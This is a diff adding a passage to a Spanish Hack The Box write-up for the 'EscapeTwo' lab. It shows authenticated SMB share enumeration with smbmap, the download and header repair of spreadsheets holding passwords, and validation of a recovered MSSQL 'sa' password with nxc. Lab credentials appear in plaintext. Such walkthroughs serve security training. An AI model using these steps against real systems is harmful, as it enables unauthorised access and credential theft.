@@ -280,3 +280,206 @@ SEQUEL\rose    guest
 
 SQL (SEQUEL\rose  guest@master)>
 ```
+## Enumeración SMB 
+
+Posteriormente realice una enumeración al protocolo SMB con las credenciales proporcionadas:
+
+```bash
+┌──(root㉿kali)-[/opt/chuleta]
+└─# smbmap -H 10.10.11.51 -d sequel.htb -u 'rose' -p 'KxEPkKe6R8su' 
+
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+                                                                                                                             
+[+] IP: 10.10.11.51:445 Name: sequel.htb                Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        Accounting Department                                   READ ONLY
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+        Users                                                   READ ONLY
+[*] Closed 1 connections                                                       
+```
+El primer recurso compartido que enumere fue **Users** sin embargo no identifique nada relevante
+
+```bash
+┌──(root㉿kali)-[/opt/chuleta]
+└─# smbmap -H 10.10.11.51 -d sequel.htb -u 'rose' -p 'KxEPkKe6R8su' -r Users
+
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
+                                                                                                                             
+[+] IP: 10.10.11.51:445 Name: sequel.htb                Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        Accounting Department                                   READ ONLY
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+        Users                                                   READ ONLY
+        ./Users
+        dw--w--w--                0 Sun Jun  9 09:42:11 2024    .
+        dw--w--w--                0 Sun Jun  9 09:42:11 2024    ..
+        dw--w--w--                0 Sun Jun  9 07:17:29 2024    Default
+        fr--r--r--              174 Sat Jun  8 22:27:10 2024    desktop.ini
+[*] Closed 1 connections                                                                           
+```
+Posteriormente enumere el recurso ** Accounting Department** donde idnetifique archivos excel interesante
+
+```bash
+──(root㉿kali)-[/opt/chuleta]
+└─# smbmap -H 10.10.11.51 -d sequel.htb -u 'rose' -p 'KxEPkKe6R8su' -r "Accounting Department" 
+
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
+                                                                                                                             
+[+] IP: 10.10.11.51:445 Name: sequel.htb                Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        Accounting Department                                   READ ONLY
+        ./Accounting Department
+        dr--r--r--                0 Sun Jun  9 07:11:31 2024    .
+        dr--r--r--                0 Sun Jun  9 07:11:31 2024    ..
+        fr--r--r--            10217 Sun Jun  9 07:11:31 2024    accounting_2024.xlsx
+        fr--r--r--             6780 Sun Jun  9 07:11:31 2024    accounts.xlsx
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+        Users                                                   READ ONLY
+[*] Closed 1 connections                                                                            
+```
+**NOTA:** `smbmap` **no permite descargar múltiples archivos en un solo comando `-A`**, ya que `-A` acepta **solo una cadena de búsqueda** para hacer _matching_. sin embargo como ambos archivos contienen un patrón común (`"account"`) unicmanete indicar -A account Eso **listará y descargará** cualquier archivo que tenga la palabra `account` en el nombre.
+
+```bash
+┌──(root㉿kali)-[/opt/chuleta]
+└─# smbmap -d sequel.htb -H 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' -r "Accounting Department" -A account
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+[*] Performing file name pattern match!                                                                                      
+[+] Match found! Downloading: Accounting Department//accounting_2024.xlsx                                                   
+[+] Starting download: Accounting Department\accounting_2024.xlsx (10217 bytes)                                             
+[+] File output to: /opt/chuleta/10.10.11.51-Accounting Department_accounting_2024.xlsx                                     
+[+] Match found! Downloading: Accounting Department//accounts.xlsx
+[+] Starting download: Accounting Department\accounts.xlsx (6780 bytes)                                                     
+[+] File output to: /opt/chuleta/10.10.11.51-Accounting Department_accounts.xlsx                                            
+[*] Closed 1 connections                   
+```
+Después de descargar ambos archivos me di cuenta que tenia un error al intentar abrirlo en excel (estaban corruptos)
+
+![](/assets/images/htb-writeup-EscapeTwo/Excel.png)
+
+Así que descomprimí ambos archivos excel desde la terminal para obtener el siguiente contenido:
+
+```bash
+.
+├── Accounting Department_accounts.xlsx
+├── [Content_Types].xml
+├── docProps
+│   ├── app.xml
+│   ├── core.xml
+│   └── custom.xml
+├── _rels
+└── xl
+    ├── _rels
+    │   └── workbook.xml.rels
+    ├── sharedStrings.xml
+    ├── styles.xml
+    ├── theme
+    │   └── theme1.xml
+    ├── workbook.xml
+    └── worksheets
+        ├── _rels
+        │   └── sheet1.xml.rels
+        └── sheet1.xml
+
+8 directories, 12 files
+```
+Después de una búsqueda identifique que los **datos como tal** (el contenido que se ve en las celdas del Excel) están en los siguientes archivos:  
+
+- xl/worksheets/sheet1.xml - Aquí están los **valores de las celdas**, pero muchas veces los valores son índices (números) que apuntan a `sharedStrings.xml`
+- xl/sharedStrings.xml - Contiene los **textos reales** (strings) que aparecen en las celdas,
+
+Por lo cual revisando el archivo `sharedStrings.xml` pude identificar credenciales:
+
+## Corregir la corrupción
+
+Para corregir la corrupción de las archivos y poder visualizarlos correctamente encontré una lista de firmas de archivos entre las cuales esta xlsx 
+
+![](/assets/images/htb-writeup-EscapeTwo/hex.png)
+
+revisando los encabezados de los archivos veo que tiene una firma diferente es por eso su corrupción así que con `hexeditor` la modifique por la correcta y logre abrirlos sin problema 
+
+```bash
+┌──(root㉿kali)-[/opt/chuleta]
+└─# xxd Department_accounts.xlsx | head -1
+00000000: 504b 0304 1400 0808 0800 f655 c958 0000  PK.........U.X..
+
+┌──(root㉿kali)-[/opt/chuleta]
+└─# xxd accounting_2024.xlsx | head -1   
+00000000: 504b 0304 1400 0600 0800 0000 2100 4137  PK..........!.A7
+```
+![](/assets/images/htb-writeup-EscapeTwo/excelc.png)
+
+Debido a que el dominio de la maquina se llama **sequel.htb** decidí validar las credenciales del usuario sa en mssql y funcionaron
+
+```bash
+┌──(root㉿kali)-[/opt/chuleta/excel]
+└─# nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
+MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
+MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
+```
+posteriormente me conecte usando **mssqlclient**
